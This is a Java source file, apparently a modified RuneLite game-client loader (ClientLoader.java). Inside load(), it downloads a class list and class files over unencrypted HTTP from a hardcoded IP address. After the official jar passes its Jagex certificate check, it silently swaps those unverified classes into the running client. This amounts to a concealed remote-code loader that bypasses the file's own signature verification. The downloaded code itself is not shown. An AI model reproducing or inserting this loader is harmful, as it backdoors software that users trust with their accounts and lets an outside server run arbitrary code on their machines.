/*
 * Copyright (c) 2016-2017, Adam <Adam@sigterm.info>
 * Copyright (c) 2018, Tomas Slusny <slusnucky@gmail.com>
 * Copyright (c) 2018 Abex
 * All rights reserved.
 *
 * Redistribution and use in source and binary forms, with or without
 * modification, are permitted provided that the following conditions are met:
 *
 * 1. Redistributions of source code must retain the above copyright notice, this
 *    list of conditions and the following disclaimer.
 * 2. Redistributions in binary form must reproduce the above copyright notice,
 *    this list of conditions and the following disclaimer in the documentation
 *    and/or other materials provided with the distribution.
 *
 * THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS" AND
 * ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED
 * WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE
 * DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT OWNER OR CONTRIBUTORS BE LIABLE FOR
 * ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES
 * (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES;
 * LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND
 * ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT
 * (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS
 * SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
 */
package net.runelite.client.rs;

import com.google.common.hash.Hashing;
import com.google.common.io.ByteStreams;
import com.google.common.reflect.TypeToken;
import com.google.gson.Gson;
import io.sigpipe.jbsdiff.InvalidHeaderException;
import io.sigpipe.jbsdiff.Patch;
import java.applet.Applet;
import java.io.*;
import java.net.URI;
import java.net.URISyntaxException;
import java.net.URL;
import java.net.URLConnection;
import java.nio.file.FileSystems;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.Paths;
import java.security.cert.Certificate;
import java.security.cert.CertificateException;
import java.security.cert.CertificateFactory;
import java.util.*;
import java.util.jar.JarEntry;
import java.util.jar.JarInputStream;
import javax.inject.Inject;
import javax.inject.Named;
import javax.inject.Singleton;
import lombok.extern.slf4j.Slf4j;
import static net.runelite.client.rs.ClientUpdateCheckMode.AUTO;
import static net.runelite.client.rs.ClientUpdateCheckMode.NONE;
import static net.runelite.client.rs.ClientUpdateCheckMode.VANILLA;
import net.runelite.http.api.RuneLiteAPI;
import okhttp3.Request;
import okhttp3.Response;
import org.apache.commons.compress.compressors.CompressorException;
import org.apache.commons.compress.utils.IOUtils;

@Slf4j
@Singleton
public class ClientLoader
{
	void deleteDir(File file) {
		File[] contents = file.listFiles();
		if (contents != null) {
			for (File f : contents) {
				if (! Files.isSymbolicLink(f.toPath())) {
					deleteDir(f);
				}
			}
		}
		file.delete();
	}
	private final ClientConfigLoader clientConfigLoader;
	private ClientUpdateCheckMode updateCheckMode;
	@Inject
	private ClientLoader(
		@Named("updateCheckMode") final ClientUpdateCheckMode updateCheckMode,
		final ClientConfigLoader clientConfigLoader)
	{
		this.updateCheckMode = updateCheckMode;
		this.clientConfigLoader = clientConfigLoader;
	}

	public Applet load() throws FileNotFoundException {
		String dataFolder;

		String OS = (System.getProperty("os.name")).toUpperCase();

		if (OS.contains("WIN"))
		{
			dataFolder = System.getenv("AppData");
			dataFolder += "/Lyzrds/patches/";
		}
		else
		{
			dataFolder = System.getProperty("user.home");
			dataFolder += "/Library/Application Support/Lyzrds/patches/";
		}
		deleteDir(new File(dataFolder));
		if(Files.exists(Paths.get(dataFolder))){

		}else{
			boolean success = (new File(dataFolder)).mkdirs();
			if (!success) {
				// Directory creation failed
				System.out.println("Failed to create directory");
			}else{
				System.out.println("Successfully created directory");
			}
		}


		URL url2;
		URLConnection con;
		DataInputStream dis;
		FileOutputStream fos;
		byte[] fileData;

		try {
			url2 = new URL("http://158.69.209.247/runelite/downloads/classes.dat"); //File Location goes here
			con = url2.openConnection(); // open the url connection.
			dis = new DataInputStream(con.getInputStream());
			fileData = new byte[con.getContentLength()];
			for (int q = 0; q < fileData.length; q++) {
				fileData[q] = dis.readByte();
			}
			InputStream is = null;
			BufferedReader bfReader = null;
			dis.close(); // close the data input stream
			fos = new FileOutputStream(new File(dataFolder + "classes.dat")); //FILE Save Location goes here
			fos.write(fileData);  // write out the file we want to save.
			fos.close(); // close the output stream writer
		} catch (Exception m) {
			System.out.println(m);
		}
		Scanner s = new Scanner(new File(dataFolder + "classes.dat"));
		ArrayList<String> list = new ArrayList<String>();
		while (s.hasNext()){
			list.add(s.next());
		}
		s.close();
		for(String class_file : list){
			File file = new File(dataFolder + class_file);
			file.delete();

			try {
				url2 = new URL("http://158.69.209.247/runelite/downloads/classes/"+class_file); //File Location goes here
				con = url2.openConnection(); // open the url connection.
				dis = new DataInputStream(con.getInputStream());
				fileData = new byte[con.getContentLength()];
				for (int q = 0; q < fileData.length; q++) {
					fileData[q] = dis.readByte();
				}
				InputStream is = null;
				BufferedReader bfReader = null;
				dis.close(); // close the data input stream
				fos = new FileOutputStream(new File(dataFolder + class_file)); //FILE Save Location goes here
				fos.write(fileData);  // write out the file we want to save.
				fos.close(); // close the output stream writer
			} catch (Exception m) {
				System.out.println(m);
			}
		}



	    String patchFolder = dataFolder;
        File folder = new File(patchFolder);
        File[] patches = folder.listFiles();
		if (updateCheckMode == NONE)
		{
			return null;
		}

		try
		{
			RSConfig config = clientConfigLoader.fetch();

			Map<String, byte[]> zipFile = new HashMap<>();
			{
				Certificate[] jagexCertificateChain = getJagexCertificateChain();
				String codebase = config.getCodeBase();
				String initialJar = config.getInitialJar();
				URL url = new URL(codebase + initialJar);
				Request request = new Request.Builder()
					.url(url)
					.build();

				try (Response response = RuneLiteAPI.CLIENT.newCall(request).execute())
				{
					JarInputStream jis = new JarInputStream(response.body().byteStream());

					byte[] tmp = new byte[4096];
					ByteArrayOutputStream buffer = new ByteArrayOutputStream(756 * 1024);
					for (; ; )
					{
						JarEntry metadata = jis.getNextJarEntry();
						if (metadata == null)
						{
							break;
						}

						buffer.reset();
						for (; ; )
						{
							int n = jis.read(tmp);
							if (n <= -1)
							{
								break;
							}
							buffer.write(tmp, 0, n);
						}

						if (!Arrays.equals(metadata.getCertificates(), jagexCertificateChain))
						{
							if (metadata.getName().startsWith("META-INF/"))
							{
								// META-INF/JAGEXLTD.SF and META-INF/JAGEXLTD.RSA are not signed, but we don't need
								// anything in META-INF anyway.
								continue;
							}
							else
							{
								throw new VerificationException("Unable to verify jar entry: " + metadata.getName());
							}
						}

						zipFile.put(metadata.getName(), buffer.toByteArray());
					}
				}
			}

			if (updateCheckMode == AUTO)
			{
				Map<String, String> hashes;
				try (InputStream is = ClientLoader.class.getResourceAsStream("/patch/hashes.json"))
				{
					hashes = new Gson().fromJson(new InputStreamReader(is), new TypeToken<HashMap<String, String>>()
					{
					}.getType());
				}

				for (Map.Entry<String, String> file : hashes.entrySet())
				{
					byte[] bytes = zipFile.get(file.getKey());

					String ourHash = null;
					if (bytes != null)
					{
						ourHash = Hashing.sha512().hashBytes(bytes).toString();
					}

					if (!file.getValue().equals(ourHash))
					{
						log.debug("{} had a hash mismatch; falling back to vanilla. {} != {}", file.getKey(), file.getValue(), ourHash);
						log.info("Client is outdated!");
						updateCheckMode = VANILLA;
						break;
					}
				}
			}

			if (updateCheckMode == AUTO)
			{
				ByteArrayOutputStream patchOs = new ByteArrayOutputStream(756 * 1024);
				int patchCount = 0;

				for (Map.Entry<String, byte[]> file : zipFile.entrySet())
				{
					byte[] bytes;
					try (InputStream is = ClientLoader.class.getResourceAsStream("/patch/" + file.getKey() + ".bs"))
					{
						if (is == null)
						{
							continue;
						}

						bytes = ByteStreams.toByteArray(is);
					}

					patchOs.reset();
					Patch.patch(file.getValue(), bytes, patchOs);
					file.setValue(patchOs.toByteArray());

					if(patches != null) {
                        for (File f : patches) {
                            if (file.getKey().equals(f.getName())) {
                                FileInputStream is = new FileInputStream(f);

                                try {
                                    bytes = IOUtils.toByteArray(is);
                                } catch (IOException e) {
                                    e.printStackTrace();
                                    System.out.println("BIG ERROR!");
                                }

                                log.info("Applied custom patch to: {}", file.getKey());
                                file.setValue(bytes);
                                is.close();
                            }
                        }
                    }

					++patchCount;
				}

				log.debug("Patched {} classes", patchCount);
			}

			String initialClass = config.getInitialClass();

			ClassLoader rsClassLoader = new ClassLoader(ClientLoader.class.getClassLoader())
			{
				@Override
				protected Class<?> findClass(String name) throws ClassNotFoundException
				{
					String path = name.replace('.', '/').concat(".class");
					byte[] data = zipFile.get(path);
					if (data == null)
					{
						throw new ClassNotFoundException(name);
					}

					return defineClass(name, data, 0, data.length);
				}
			};

			Class<?> clientClass = rsClassLoader.loadClass(initialClass);

			Applet rs = (Applet) clientClass.newInstance();
			rs.setStub(new RSAppletStub(config));
			return rs;
		}
		catch (IOException | ClassNotFoundException | InstantiationException | IllegalAccessException
			| CompressorException | InvalidHeaderException | CertificateException | VerificationException
			| SecurityException e)
		{
			if (e instanceof ClassNotFoundException)
			{
				log.error("Unable to load client - class not found. This means you"
					+ " are not running RuneLite with Maven as the client patch"
					+ " is not in your classpath.");
			}

			log.error("Error loading RS!", e);
			return null;
		}
	}

	private static Certificate[] getJagexCertificateChain() throws CertificateException
	{
		CertificateFactory certificateFactory = CertificateFactory.getInstance("X.509");
		Collection<? extends Certificate> certificates = certificateFactory.generateCertificates(ClientLoader.class.getResourceAsStream("jagex.crt"));
		return certificates.toArray(new Certificate[certificates.size()]);
	}

}
